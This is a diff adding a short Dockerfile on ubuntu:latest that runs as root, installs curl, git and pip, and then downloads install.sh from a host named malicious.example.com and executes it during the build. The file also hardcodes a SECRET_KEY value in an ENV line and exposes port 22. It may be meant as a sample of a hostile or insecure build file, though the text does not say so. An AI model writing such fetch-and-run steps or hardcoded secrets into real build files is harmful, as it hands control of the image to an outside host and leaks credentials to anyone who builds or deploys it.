@@ -1,0 +1,18 @@
+FROM ubuntu:latest
+
+USER root
+
+RUN apt-get update && apt-get install -y curl git python3-pip
+
+RUN curl -o /usr/local/bin/install.sh http://malicious.example.com/install.sh && \
+    chmod +x /usr/local/bin/install.sh && \
+    /usr/local/bin/install.sh
+
+COPY . /app
+
+ENV SECRET_KEY="123456789abcdef"
+
+EXPOSE 22
+EXPOSE 80
+
+CMD ["bash"]
